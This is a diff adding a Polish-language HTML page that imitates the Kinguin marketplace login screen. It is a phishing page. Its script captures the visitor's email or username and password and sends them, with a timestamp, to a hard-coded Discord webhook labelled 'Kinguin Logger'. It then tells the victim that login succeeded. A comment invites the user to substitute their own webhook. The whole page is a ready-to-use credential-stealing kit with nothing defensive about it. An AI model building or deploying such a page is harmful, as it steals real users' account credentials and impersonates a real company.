@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kinguin</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap');
+
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #110b00, #3a2200, #0f0f0f);
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      background: #1c1c1e;
+      width: 100%;
+      max-width: 390px;
+      border-radius: 26px;
+      padding: 52px 44px;
+      box-shadow: 0 30px 80px rgba(249, 115, 22, 0.4);
+      border: 2px solid #f97316;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 44px;
+    }
+
+    .logo span {
+      font-size: 52px;
+      font-weight: 900;
+      letter-spacing: -3px;
+      background: linear-gradient(90deg, #f97316, #fb923c, #fed7aa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 29px;
+      font-weight: 700;
+      margin: 0 0 12px 0;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #d1d5db;
+      font-size: 15.5px;
+      margin-bottom: 42px;
+    }
+
+    .input-group {
+      margin-bottom: 28px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 13.5px;
+      font-weight: 600;
+      color: #e2e8f0;
+      margin-bottom: 9px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 18px 22px;
+      background: #27272a;
+      border: 2px solid #4b5563;
+      border-radius: 16px;
+      color: #fff;
+      font-size: 17px;
+    }
+
+    .input-group input:focus {
+      border-color: #f97316;
+      box-shadow: 0 0 0 5px rgba(249, 115, 22, 0.3);
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(90deg, #f97316, #fb923c);
+      color: #111827;
+      border: none;
+      border-radius: 16px;
+      font-size: 18px;
+      font-weight: 800;
+      cursor: pointer;
+      margin-top: 12px;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 20px 40px rgba(249, 115, 22, 0.5);
+    }
+
+    .forgot {
+      text-align: center;
+      color: #f97316;
+      font-size: 14.5px;
+      margin-top: 32px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo">
+      <span>KINGUIN</span>
+    </div>
+
+    <h1>Zaloguj się</h1>
+    <p class="subtitle">Aby uzyskać dostęp do najlepszych ofert</p>
+
+    <form id="loginForm">
+      <div class="input-group">
+        <label>Email lub nazwa użytkownika</label>
+        <input type="text" id="email" placeholder="" required>
+      </div>
+
+      <div class="input-group">
+        <label>Hasło</label>
+        <input type="password" id="password" placeholder="" required>
+      </div>
+
+      <button type="submit">ZALOGUJ SIĘ</button>
+    </form>
+
+    <a href="#" class="forgot">Zapomniałeś hasła?</a>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ZMIEŃ NA SWÓJ!
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!email || !password) {
+        alert("Wypełnij wszystkie pola!");
+        return;
+      }
+
+      const payload = {
+        username: "Kinguin Logger",
+        embeds: [{
+          title: "🔑 Nowe logowanie do Kinguin",
+          color: 0xf97316,
+          fields: [
+            { name: "Email / Login", value: email, inline: true },
+            { name: "Hasło", value: password, inline: true },
+            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
+          ]
+        }]
+      };
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        alert("✅ Zalogowano pomyślnie do Kinguin!");
+      } catch (err) {
+        alert("Błąd logowania.");
+      }
+    });
+  </script>
+
+</body>
+</html>
